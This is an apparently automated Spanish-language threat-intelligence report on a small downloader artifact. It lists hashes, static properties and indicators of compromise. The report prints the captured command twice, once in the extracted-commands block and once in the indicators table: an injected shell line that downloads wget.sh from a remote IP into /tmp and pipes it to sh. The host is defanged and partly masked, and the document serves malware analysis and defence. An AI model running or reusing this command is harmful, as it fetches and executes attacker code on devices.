# 🧬 Payload Analysis

`5f0481ea757d0d2b5cbe9aff05f87e223bd6592e12ee9e6fbc8ef32cd545f0c9`

## 📌 Resumen

Artefacto identificado como ASCII text, with no line terminators de 166 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `5f0481ea757d0d2b5cbe9aff05f87e223bd6592e12ee9e6fbc8ef32cd545f0c9`
- **MD5:** `04b49625be0a92da7734fa2b6d4b4fba`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 166 B |
| Entropía | 4.66 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
hostname=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s russ;busybox wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s rus
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 91.92.40.XXX | static_analysis |
| command | hostname=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s russ;busybox wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s rus | strings |
| hash | 5f0481ea757d0d2b5cbe9aff05f87e223bd6592e12ee9e6fbc8ef32cd545f0c9 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
